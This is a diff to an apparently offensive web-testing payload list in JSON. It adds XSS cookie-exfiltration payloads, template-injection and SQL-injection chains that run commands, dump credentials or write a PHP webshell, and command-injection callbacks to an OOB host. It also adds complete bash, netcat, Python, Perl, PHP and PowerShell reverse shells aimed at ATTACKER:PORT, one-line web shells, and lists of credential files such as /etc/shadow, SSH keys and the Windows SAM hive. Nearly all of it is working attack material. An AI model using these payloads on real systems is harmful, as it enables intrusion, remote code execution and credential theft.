@@ -16,8 +16,11 @@
       {"value": "<a href=javascript:alert(1)>click</a>", "note": "javascript: in href"},
       {"value": "javascript:alert(1)", "note": "Raw URL/href sink"},
       {"value": "<marquee onstart=alert(1)>", "note": "onstart event"},
+      {"value": "<select autofocus onfocus=alert(1)>", "note": "Form element autofocus"},
+      {"value": "<textarea autofocus onfocus=alert(1)>", "note": "Textarea autofocus"},
+      {"value": "<keygen autofocus onfocus=alert(1)>", "note": "keygen autofocus"},
       {"value": "<script>fetch('//OOB/?c='+document.cookie)</script>", "note": "Cookie exfiltration to OOB"},
-      {"value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "note": "Polyglot for many contexts"}
+      {"value": "<img src=x onerror=\"new Image().src='//OOB/?c='+document.cookie\">", "note": "Image-beacon cookie exfil"}
     ]
   },
   {
@@ -37,7 +40,9 @@
       {"value": "<<script>alert(1);//<</script>", "note": "Double angle bracket"},
       {"value": "<x onclick=alert(1)>click", "note": "Arbitrary tag + event"},
       {"value": "<img src=x onerror=confirm(1)>", "note": "Alternate sink function"},
-      {"value": "<svg><script>alert&#40;1&#41;</script></svg>", "note": "SVG-namespaced script"}
+      {"value": "<svg><script>alert&#40;1&#41;</script></svg>", "note": "SVG-namespaced script"},
+      {"value": "<script>onerror=alert;throw 1</script>", "note": "throw-based, no parens"},
+      {"value": "<a href=\"jav&#x09;ascript:alert(1)\">x</a>", "note": "Tab inside javascript scheme"}
     ]
   },
   {
@@ -47,37 +52,95 @@
       {"value": "{{constructor.constructor('alert(1)')()}}", "note": "AngularJS sandbox escape (>=1.6)"},
       {"value": "{{$on.constructor('alert(1)')()}}", "note": "AngularJS 1.6 sandbox escape"},
       {"value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "note": "AngularJS 1.3.x"},
+      {"value": "{{$eval.constructor('alert(1)')()}}", "note": "AngularJS $eval escape"},
       {"value": "#\" onmouseover=\"alert(1)", "note": "Hash-based DOM sink breakout"},
       {"value": "javascript:void(alert(document.domain))", "note": "javascript: sink with domain"},
       {"value": "\"><img src=x onerror=eval(location.hash.slice(1))>#alert(1)", "note": "location.hash sink"},
       {"value": "'-alert(1)-'", "note": "Breakout inside a JS string sink"},
       {"value": "\\'-alert(1)//", "note": "Escaped-quote JS context"},
-      {"value": "</script><script>alert(1)</script>", "note": "Break out of an inline script block"}
+      {"value": "</script><script>alert(1)</script>", "note": "Break out of an inline script block"},
+      {"value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}", "note": "Vue.js CSTI"}
     ]
   },
   {
-    "name": "SSTI (template injection)",
+    "name": "XSS - polyglots",
     "payloads": [
-      {"value": "{{7*7}}", "note": "Detect: Jinja2/Twig render 49"},
-      {"value": "{{7*'7'}}", "note": "Fingerprint: 7777777=Jinja2, 49=Twig"},
+      {"value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "note": "Ostrowski polyglot (works in many contexts)"},
+      {"value": "'\"><img src=x onerror=alert(1)>", "note": "Quote/tag breakout"},
+      {"value": "\"></title></style></textarea></script><script>alert(1)</script>", "note": "Escape several HTML contexts"},
+      {"value": "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>", "note": "Compact multi-context polyglot"}
+    ]
+  },
+  {
+    "name": "SSTI - detection & fingerprint",
+    "payloads": [
+      {"value": "{{7*7}}", "note": "Jinja2/Twig render 49"},
+      {"value": "{{7*'7'}}", "note": "7777777 = Jinja2, 49 = Twig"},
       {"value": "${7*7}", "note": "FreeMarker / JSP EL / Thymeleaf"},
       {"value": "#{7*7}", "note": "Ruby / JSF / Thymeleaf"},
       {"value": "*{7*7}", "note": "Thymeleaf selection expression"},
       {"value": "<%= 7*7 %>", "note": "ERB (Ruby) / EJS"},
       {"value": "@(7*7)", "note": "Razor (.NET)"},
-      {"value": "{{config}}", "note": "Jinja2 (Flask) config dump"},
-      {"value": "{{config.items()}}", "note": "Jinja2 config key/value dump"},
-      {"value": "{{''.__class__.__mro__[1].__subclasses__()}}", "note": "Jinja2 gadget enumeration"},
-      {"value": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "note": "Jinja2 RCE"},
-      {"value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "note": "Jinja2/Flask RCE"},
+      {"value": "#{7*7}", "note": "Slim / Pug interpolation"},
+      {"value": "{{= 7*7 }}", "note": "Underscore / EJS variant"},
+      {"value": "a{*comment*}b", "note": "Smarty comment (a...b indicates Smarty)"},
+      {"value": "${{7*7}}", "note": "Mixed/Smarty detection"},
+      {"value": "{{7*7}}${7*7}<%= 7*7 %>#{7*7}", "note": "Fire-and-see multi-engine probe"}
+    ]
+  },
+  {
+    "name": "SSTI - Jinja2 (Python)",
+    "payloads": [
+      {"value": "{{config}}", "note": "Flask config dump"},
+      {"value": "{{config.items()}}", "note": "Config key/value dump"},
+      {"value": "{{''.__class__.__mro__[1].__subclasses__()}}", "note": "Enumerate gadget classes"},
+      {"value": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "note": "RCE via os.popen"},
+      {"value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "note": "RCE via request globals"},
+      {"value": "{{cycler.__init__.__globals__.os.popen('id').read()}}", "note": "RCE via cycler gadget"},
+      {"value": "{{lipsum.__globals__.os.popen('id').read()}}", "note": "RCE via lipsum gadget"},
+      {"value": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}", "note": "File read gadget"},
+      {"value": "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}", "note": "catch_warnings RCE chain"}
+    ]
+  },
+  {
+    "name": "SSTI - Twig (PHP)",
+    "payloads": [
+      {"value": "{{7*'7'}}", "note": "Returns 49 in Twig"},
+      {"value": "{{_self}}", "note": "Dump the current template object"},
+      {"value": "{{['id']|filter('system')}}", "note": "RCE via filter (Twig 1.x)"},
+      {"value": "{{['id']|map('system')|join}}", "note": "RCE via map"},
+      {"value": "{{['id',0]|sort('system')|join}}", "note": "RCE via sort callback"},
+      {"value": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "note": "RCE (Twig 1.x undefined-filter callback)"},
+      {"value": "{{attribute(_self,'env').setCache('ftp://OOB')}}", "note": "Twig cache SSRF/RCE gadget"}
+    ]
+  },
+  {
+    "name": "SSTI - Java (FreeMarker/Velocity/SpEL)",
+    "payloads": [
       {"value": "${T(java.lang.Runtime).getRuntime().exec('id')}", "note": "Spring SpEL RCE"},
+      {"value": "${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'})}", "note": "SpEL RCE (array args)"},
+      {"value": "#{T(java.lang.Runtime).getRuntime().exec('id')}", "note": "SpEL with # syntax"},
       {"value": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "note": "FreeMarker RCE"},
+      {"value": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "note": "FreeMarker RCE (assign)"},
       {"value": "#set($e=\"\")#set($rt=$e.class.forName('java.lang.Runtime'))$rt.getRuntime().exec('id')", "note": "Velocity RCE"},
+      {"value": "#set($x=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))", "note": "Velocity RCE (class tool)"},
+      {"value": "${(#a=@java.lang.Runtime@getRuntime().exec('id'))}", "note": "OGNL (Struts2) RCE"}
+    ]
+  },
+  {
+    "name": "SSTI - other engines",
+    "payloads": [
       {"value": "{php}echo `id`;{/php}", "note": "Smarty (older) RCE"},
       {"value": "{system('id')}", "note": "Smarty function call"},
-      {"value": "{{#with \"s\" as |string|}}{{#with (string.sub.apply 0 (string.split.apply \"\"))}}...{{/with}}{{/with}}", "note": "Handlebars RCE (see PayloadsAllTheThings for full)"},
+      {"value": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('id'); ?>\",self::clearConfig())}", "note": "Smarty write-file RCE"},
       {"value": "${self.module.cache.util.os.system('id')}", "note": "Mako (Python) RCE"},
-      {"value": "#{ system('id') }", "note": "Ruby ERB-style RCE"}
+      {"value": "<%= system('id') %>", "note": "ERB (Ruby) RCE"},
+      {"value": "<%= `id` %>", "note": "ERB backtick RCE"},
+      {"value": "{{#with \"s\" as |string|}}{{#with split}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}", "note": "Handlebars RCE (truncated; see PayloadsAllTheThings)"},
+      {"value": "@(1+2)", "note": "Razor detection"},
+      {"value": "#{ 7*7 }", "note": "Pug/Jade interpolation"},
+      {"value": "#{root.process.mainModule.require('child_process').execSync('id')}", "note": "Pug RCE (Node)"},
+      {"value": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}", "note": "Nunjucks RCE (Node)"}
     ]
   },
   {
@@ -98,21 +161,65 @@
     ]
   },
   {
-    "name": "SQLi - UNION / error / DB-specific",
+    "name": "SQLi - MySQL",
     "payloads": [
-      {"value": "' ORDER BY 1-- -", "note": "Increment to find column count"},
-      {"value": "' UNION SELECT NULL-- -", "note": "Match one column"},
-      {"value": "' UNION SELECT NULL,NULL-- -", "note": "Match two columns"},
-      {"value": "' UNION SELECT @@version-- -", "note": "MySQL / MSSQL version"},
-      {"value": "' UNION SELECT version()-- -", "note": "MySQL / PostgreSQL version"},
-      {"value": "' UNION SELECT banner FROM v$version-- -", "note": "Oracle version"},
-      {"value": "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", "note": "Enumerate tables"},
-      {"value": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", "note": "Enumerate columns"},
-      {"value": "' AND extractvalue(1,concat(0x7e,version()))-- -", "note": "MySQL error-based (extractvalue)"},
-      {"value": "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -", "note": "MySQL error-based (updatexml)"},
-      {"value": "' AND 1=CONVERT(int,@@version)-- -", "note": "MSSQL error-based"},
-      {"value": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -", "note": "Oracle error-based"},
-      {"value": "' UNION SELECT NULL,concat(username,0x3a,password) FROM users-- -", "note": "Dump credentials"}
+      {"value": "' UNION SELECT @@version,2-- -", "note": "Version"},
+      {"value": "' UNION SELECT user(),database()-- -", "note": "Current user + DB"},
+      {"value": "' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -", "note": "Tables in current DB"},
+      {"value": "' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -", "note": "Columns of users"},
+      {"value": "' UNION SELECT group_concat(user,0x3a,password),2 FROM users-- -", "note": "Dump creds"},
+      {"value": "' AND extractvalue(1,concat(0x7e,version()))-- -", "note": "Error-based (extractvalue)"},
+      {"value": "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", "note": "Error-based (updatexml)"},
+      {"value": "' UNION SELECT load_file('/etc/passwd'),2-- -", "note": "Read file (FILE priv)"},
+      {"value": "' UNION SELECT '<?php system($_GET[0]);?>',2 INTO OUTFILE '/var/www/html/s.php'-- -", "note": "Write webshell (FILE priv + path)"}
+    ]
+  },
+  {
+    "name": "SQLi - PostgreSQL",
+    "payloads": [
+      {"value": "' UNION SELECT version(),2-- -", "note": "Version"},
+      {"value": "' UNION SELECT current_user,current_database()-- -", "note": "User + DB"},
+      {"value": "' UNION SELECT table_name,2 FROM information_schema.tables-- -", "note": "List tables"},
+      {"value": "' UNION SELECT string_agg(usename||':'||passwd,',') ,2 FROM pg_shadow-- -", "note": "Dump roles (superuser)"},
+      {"value": "'; SELECT pg_sleep(5)-- -", "note": "Time-based"},
+      {"value": "'; COPY (SELECT '') TO PROGRAM 'id'-- -", "note": "RCE via COPY TO PROGRAM (superuser)"},
+      {"value": "' AND 1=CAST(version() AS int)-- -", "note": "Error-based type cast"},
+      {"value": "' UNION SELECT pg_read_file('/etc/passwd'),2-- -", "note": "Read file (superuser)"}
+    ]
+  },
+  {
+    "name": "SQLi - MSSQL",
+    "payloads": [
+      {"value": "' UNION SELECT @@version,2-- -", "note": "Version"},
+      {"value": "' UNION SELECT SYSTEM_USER,DB_NAME()-- -", "note": "User + DB"},
+      {"value": "' UNION SELECT name,2 FROM sysobjects WHERE xtype='U'-- -", "note": "List user tables"},
+      {"value": "'; WAITFOR DELAY '0:0:5'-- -", "note": "Time-based"},
+      {"value": "' AND 1=CONVERT(int,@@version)-- -", "note": "Error-based"},
+      {"value": "'; EXEC xp_cmdshell 'whoami'-- -", "note": "RCE via xp_cmdshell (if enabled)"},
+      {"value": "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -", "note": "Enable xp_cmdshell"},
+      {"value": "'; EXEC master..xp_dirtree '\\\\OOB\\share'-- -", "note": "OOB / NetNTLM capture (UNC)"}
+    ]
+  },
+  {
+    "name": "SQLi - Oracle",
+    "payloads": [
+      {"value": "' UNION SELECT banner,2 FROM v$version-- -", "note": "Version"},
+      {"value": "' UNION SELECT user,2 FROM dual-- -", "note": "Current user"},
+      {"value": "' UNION SELECT table_name,2 FROM all_tables-- -", "note": "List tables"},
+      {"value": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -", "note": "Error-based"},
+      {"value": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -", "note": "Time-based"},
+      {"value": "' UNION SELECT UTL_HTTP.REQUEST('http://OOB/'),2 FROM dual-- -", "note": "OOB via UTL_HTTP"},
+      {"value": "' UNION SELECT NULL FROM dual WHERE 1=UTL_INADDR.GET_HOST_ADDRESS('OOB')-- -", "note": "OOB via DNS"}
+    ]
+  },
+  {
+    "name": "SQLi - SQLite",
+    "payloads": [
+      {"value": "' UNION SELECT sqlite_version(),2-- -", "note": "Version"},
+      {"value": "' UNION SELECT name,sql FROM sqlite_master-- -", "note": "Dump schema"},
+      {"value": "' UNION SELECT group_concat(name),2 FROM sqlite_master WHERE type='table'-- -", "note": "List tables"},
+      {"value": "' AND 1=randomblob(1000000000)-- -", "note": "Heavy op (time-based)"},
+      {"value": "' AND CASE WHEN (1=1) THEN 1 ELSE randomblob(1000000000) END-- -", "note": "Boolean time-based"}
     ]
   },
   {
@@ -122,13 +229,12 @@
       {"value": "' AND 1=2-- -", "note": "Boolean FALSE control"},
       {"value": "' AND SLEEP(5)-- -", "note": "MySQL time-based"},
       {"value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "note": "MySQL subquery time-based"},
-      {"value": "' AND IF(1=1,SLEEP(5),0)-- -", "note": "MySQL conditional time-based"},
-      {"value": "'; WAITFOR DELAY '0:0:5'-- -", "note": "MSSQL time-based"},
-      {"value": "' AND pg_sleep(5)-- -", "note": "PostgreSQL time-based"},
-      {"value": "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -", "note": "PostgreSQL time-based (subquery)"},
-      {"value": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -", "note": "Oracle time-based"},
-      {"value": "' RLIKE SLEEP(5)-- -", "note": "MySQL RLIKE time-based"},
-      {"value": "' OR BENCHMARK(5000000,MD5(1))-- -", "note": "MySQL CPU-heavy delay"}
+      {"value": "' AND IF(1=1,SLEEP(5),0)-- -", "note": "MySQL conditional"},
+      {"value": "'; WAITFOR DELAY '0:0:5'-- -", "note": "MSSQL"},
+      {"value": "' AND pg_sleep(5)-- -", "note": "PostgreSQL"},
+      {"value": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -", "note": "Oracle"},
+      {"value": "' RLIKE SLEEP(5)-- -", "note": "MySQL RLIKE"},
+      {"value": "' OR IF(substring(database(),1,1)='a',SLEEP(5),0)-- -", "note": "Char-by-char extraction"}
     ]
   },
   {
@@ -141,12 +247,13 @@
       {"value": "' oR 1=1-- -", "note": "Mixed case keyword"},
       {"value": "' OR 1 like 1-- -", "note": "LIKE instead of ="},
       {"value": "'+OR+1=1--+", "note": "Plus as space"},
-      {"value": "%27%20OR%201=1--%20-", "note": "URL-encoded"},
+      {"value": "%2527%20OR%201=1", "note": "Double URL-encoded quote"},
       {"value": "' OR 1=1%23", "note": "URL-encoded # comment"},
       {"value": "' OR 'a'||'b'='ab", "note": "String concatenation (Oracle/PostgreSQL)"},
-      {"value": "' OR 2>1-- -", "note": "Alternate always-true"},
       {"value": "'%0aOR%0a1=1-- -", "note": "Newline as whitespace"},
-      {"value": "'||(SELECT 1)||'", "note": "Concatenated subquery"}
+      {"value": "'||(SELECT 1)||'", "note": "Concatenated subquery"},
+      {"value": "0e1 OR 1", "note": "Scientific-notation number"},
+      {"value": "' OR/**/1=1-- -", "note": "Comment right after keyword"}
     ]
   },
   {
@@ -162,31 +269,50 @@
       {"value": "username[$ne]=1&password[$ne]=1", "note": "Operator injection via query string"},
       {"value": "admin' || '1'=='1", "note": "JS string injection"},
       {"value": "';return true;var x='", "note": "$where JS breakout"},
-      {"value": "{\"$nin\": [\"\"]}", "note": "Not-in empty set"}
+      {"value": "{\"$nin\": [\"\"]}", "note": "Not-in empty set"},
+      {"value": "{\"password\": {\"$regex\": \"^a\"}}", "note": "Blind regex password extraction"}
     ]
   },
   {
-    "name": "Command injection",
+    "name": "Command injection - Linux",
     "payloads": [
-      {"value": "; id", "note": "Command separator (Unix)"},
+      {"value": "; id", "note": "Command separator"},
       {"value": "| id", "note": "Pipe"},
-      {"value": "& id", "note": "Background / AND (Windows & Unix)"},
-      {"value": "&& id", "note": "Run if previous succeeds"},
       {"value": "|| id", "note": "Run if previous fails"},
+      {"value": "&& id", "note": "Run if previous succeeds"},
       {"value": "`id`", "note": "Backtick substitution"},
       {"value": "$(id)", "note": "Command substitution"},
-      {"value": "; sleep 5", "note": "Time-based confirm (Unix)"},
-      {"value": "& ping -n 4 127.0.0.1", "note": "Time-based confirm (Windows)"},
-      {"value": "; ping -c 4 127.0.0.1", "note": "Time-based confirm (Unix)"},
       {"value": "%0aid", "note": "Newline injection"},
+      {"value": "; uname -a", "note": "Kernel/OS info"},
       {"value": "; cat /etc/passwd", "note": "Read a file"},
+      {"value": "; sleep 5", "note": "Time-based confirm"},
+      {"value": "; ping -c 4 127.0.0.1", "note": "Time-based confirm (ping)"},
       {"value": "; nslookup OOB", "note": "Blind OOB DNS"},
-      {"value": "$(curl OOB)", "note": "Blind OOB HTTP"},
-      {"value": "| whoami", "note": "Windows/Unix identity"}
+      {"value": "; curl http://OOB/$(whoami)", "note": "Blind OOB HTTP exfil"},
+      {"value": "; wget http://OOB/", "note": "Blind OOB HTTP"}
     ]
   },
   {
-    "name": "Command injection - WAF/filter bypass",
+    "name": "Command injection - Windows",
+    "payloads": [
+      {"value": "& whoami", "note": "Run second command"},
+      {"value": "&& whoami", "note": "Run if previous succeeds"},
+      {"value": "| whoami", "note": "Pipe"},
+      {"value": "|| whoami", "note": "Run if previous fails"},
+      {"value": "& type C:\\Windows\\win.ini", "note": "Read a file"},
+      {"value": "& ping -n 5 127.0.0.1", "note": "Time-based confirm"},
+      {"value": "& ipconfig /all", "note": "Network info"},
+      {"value": "& net user", "note": "Local users"},
+      {"value": "& systeminfo", "note": "Host info"},
+      {"value": "& nslookup OOB", "note": "Blind OOB DNS"},
+      {"value": "& certutil -urlcache -f http://OOB/x x", "note": "Blind OOB HTTP / file download"},
+      {"value": "& powershell -c \"whoami\"", "note": "Invoke PowerShell"},
+      {"value": "%0a whoami", "note": "Newline injection"},
+      {"value": "\"&whoami&\"", "note": "Break out of a quoted argument"}
+    ]
+  },
+  {
+    "name": "Command injection - filter bypass",
     "payloads": [
       {"value": ";cat$IFS/etc/passwd", "note": "$IFS instead of space"},
       {"value": ";cat${IFS}/etc/passwd", "note": "${IFS} braces"},
@@ -201,11 +327,97 @@
       {"value": ";$'\\x69\\x64'", "note": "Hex-escaped command (id)"},
       {"value": ";$'\\143\\141\\164'/etc/passwd", "note": "Octal-escaped command (cat)"},
       {"value": "%0acat%09/etc/passwd", "note": "Newline + tab as separators"},
-      {"value": ";rev<<<'dwssap/cte/ tac'|sh", "note": "Reversed command"}
+      {"value": ";rev<<<'dwssap/cte/ tac'|sh", "note": "Reversed command"},
+      {"value": "&set a=who&set b=ami&call %a%%b%", "note": "Windows variable concatenation"},
+      {"value": "&who^ami", "note": "Windows caret escape"}
     ]
   },
   {
-    "name": "LFI / Path traversal",
+    "name": "Reverse shell - Linux",
+    "payloads": [
+      {"value": "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1", "note": "Bash /dev/tcp (most common)"},
+      {"value": "0<&196;exec 196<>/dev/tcp/ATTACKER/PORT; sh <&196 >&196 2>&196", "note": "Bash fd variant"},
+      {"value": "sh -i >& /dev/udp/ATTACKER/PORT 0>&1", "note": "UDP variant"},
+      {"value": "nc -e /bin/sh ATTACKER PORT", "note": "Netcat with -e"},
+      {"value": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f", "note": "Netcat without -e (mkfifo)"},
+      {"value": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "note": "Python 2 reverse shell"},
+      {"value": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'", "note": "Python 3 + pty"},
+      {"value": "perl -e 'use Socket;$i=\"ATTACKER\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "note": "Perl reverse shell"},
+      {"value": "php -r '$sock=fsockopen(\"ATTACKER\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "note": "PHP reverse shell"},
+      {"value": "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "note": "Ruby reverse shell"},
+      {"value": "socat TCP:ATTACKER:PORT EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane", "note": "socat (fully interactive)"},
+      {"value": "mkfifo /tmp/p; /bin/sh /tmp/p 2>&1 | openssl s_client -quiet -connect ATTACKER:PORT > /tmp/p", "note": "Encrypted (openssl)"}
+    ]
+  },
+  {
+    "name": "Reverse shell - Windows",
+    "payloads": [
+      {"value": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", "note": "PowerShell reverse shell (Nishang-style)"},
+      {"value": "nc.exe ATTACKER PORT -e cmd.exe", "note": "Netcat for Windows"},
+      {"value": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\"", "note": "Download + run a PS payload"},
+      {"value": "certutil -urlcache -f http://ATTACKER/nc.exe nc.exe & nc.exe ATTACKER PORT -e cmd.exe", "note": "Fetch nc.exe then connect"},
+      {"value": "powershell -e BASE64ENCODEDPAYLOAD", "note": "Encoded command (avoids quoting/AV)"},
+      {"value": "cmd /c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c ...\"", "note": "Full path PS invocation"}
+    ]
+  },
+  {
+    "name": "Web shells (one-liners)",
+    "payloads": [
+      {"value": "<?php system($_GET['cmd']); ?>", "note": "PHP: /?cmd=id"},
+      {"value": "<?php echo shell_exec($_REQUEST['c']); ?>", "note": "PHP: GET/POST c"},
+      {"value": "<?=`$_GET[0]`?>", "note": "PHP short-tag backtick"},
+      {"value": "<?php eval($_POST['x']); ?>", "note": "PHP eval (China Chopper style)"},
+      {"value": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "note": "JSP"},
+      {"value": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]); %>", "note": "ASPX"},
+      {"value": "<% eval request(\"cmd\") %>", "note": "Classic ASP"},
+      {"value": "system(@ARGV[0]);", "note": "Perl CGI shell snippet"}
+    ]
+  },
+  {
+    "name": "LFI - Linux files",
+    "payloads": [
+      {"value": "/etc/passwd", "note": "User accounts"},
+      {"value": "/etc/shadow", "note": "Password hashes (needs root)"},
+      {"value": "/etc/hosts", "note": "Host mappings"},
+      {"value": "/etc/hostname", "note": "Hostname"},
+      {"value": "/etc/issue", "note": "OS banner"},
+      {"value": "/etc/group", "note": "Groups"},
+      {"value": "/etc/crontab", "note": "Scheduled jobs"},
+      {"value": "/proc/self/environ", "note": "Env (RCE via User-Agent/Referer injection)"},
+      {"value": "/proc/self/cmdline", "note": "Process command line"},
+      {"value": "/proc/version", "note": "Kernel version"},
+      {"value": "/proc/net/tcp", "note": "Open TCP sockets"},
+      {"value": "/var/log/apache2/access.log", "note": "Apache log (log poisoning RCE)"},
+      {"value": "/var/log/auth.log", "note": "Auth log (SSH log poisoning)"},
+      {"value": "/root/.bash_history", "note": "Root command history"},
+      {"value": "/home/USER/.ssh/id_rsa", "note": "SSH private key"},
+      {"value": "/home/USER/.ssh/authorized_keys", "note": "SSH authorized keys"},
+      {"value": "/var/www/html/config.php", "note": "App config (DB creds)"},
+      {"value": "/etc/mysql/my.cnf", "note": "MySQL config"}
+    ]
+  },
+  {
+    "name": "LFI - Windows files",
+    "payloads": [
+      {"value": "C:\\Windows\\win.ini", "note": "Classic LFI proof"},
+      {"value": "C:\\Windows\\System32\\drivers\\etc\\hosts", "note": "Host mappings"},
+      {"value": "C:\\boot.ini", "note": "Legacy boot config"},
+      {"value": "C:\\Windows\\System32\\config\\SAM", "note": "SAM (locked while running)"},
+      {"value": "C:\\Windows\\System32\\config\\RegBack\\SAM", "note": "Backup SAM (often readable)"},
+      {"value": "C:\\Windows\\System32\\config\\SYSTEM", "note": "SYSTEM hive"},
+      {"value": "C:\\Windows\\repair\\SAM", "note": "Repair copy of SAM"},
+      {"value": "C:\\Windows\\Panther\\Unattend.xml", "note": "Unattended install (creds)"},
+      {"value": "C:\\Windows\\Panther\\Unattended.xml", "note": "Unattended install (creds)"},
+      {"value": "C:\\inetpub\\wwwroot\\web.config", "note": "IIS app config (connection strings)"},
+      {"value": "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config", "note": "IIS global config"},
+      {"value": "C:\\Windows\\debug\\NetSetup.log", "note": "Domain-join log"},
+      {"value": "C:\\xampp\\apache\\logs\\access.log", "note": "XAMPP Apache log (log poisoning)"},
+      {"value": "C:\\xampp\\apache\\conf\\httpd.conf", "note": "XAMPP Apache config"},
+      {"value": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", "note": "Security event log"}
+    ]
+  },
+  {
+    "name": "LFI - traversal & filter bypass",
     "payloads": [
       {"value": "../../../../etc/passwd", "note": "Classic Unix traversal"},
       {"value": "../../../../../../../../etc/passwd", "note": "Deep traversal"},
@@ -213,14 +425,13 @@
       {"value": "..%252f..%252f..%252fetc%252fpasswd", "note": "Double URL-encoded"},
       {"value": "....//....//....//etc/passwd", "note": "Bypass naive ../ stripping"},
       {"value": "..%c0%af..%c0%af..%c0%afetc/passwd", "note": "Overlong UTF-8 slash"},
-      {"value": "/etc/passwd", "note": "Absolute path"},
       {"value": "/etc/passwd%00", "note": "Null byte truncation (old PHP)"},
       {"value": "/etc/passwd%00.png", "note": "Null byte + expected extension"},
       {"value": "..\\..\\..\\windows\\win.ini", "note": "Windows traversal"},
       {"value": "..%5c..%5c..%5cwindows%5cwin.ini", "note": "URL-encoded backslashes"},
-      {"value": "C:\\Windows\\System32\\drivers\\etc\\hosts", "note": "Windows absolute path"},
-      {"value": "/proc/self/environ", "note": "Env (UA/Referer injection RCE)"},
-      {"value": "/var/log/apache2/access.log", "note": "Log poisoning target"}
+      {"value": "....\\\\....\\\\windows\\win.ini", "note": "Doubled backslash bypass (Windows)"},
+      {"value": "/var/www/../../etc/passwd", "note": "Absolute + traversal"},
+      {"value": "file:///etc/passwd", "note": "file:// scheme"}
     ]
   },
   {
@@ -229,6 +440,7 @@
       {"value": "php://filter/convert.base64-encode/resource=index.php", "note": "Read PHP source as base64"},
       {"value": "php://filter/read=convert.base64-encode/resource=config.php", "note": "Read config source"},
       {"value": "php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "note": "iconv filter variant"},
+      {"value": "php://filter/convert.base64-encode/convert.base64-encode/resource=/etc/passwd", "note": "Chained filter"},
       {"value": "data://text/plain,<?php system($_GET['c']);?>", "note": "data:// wrapper RCE"},
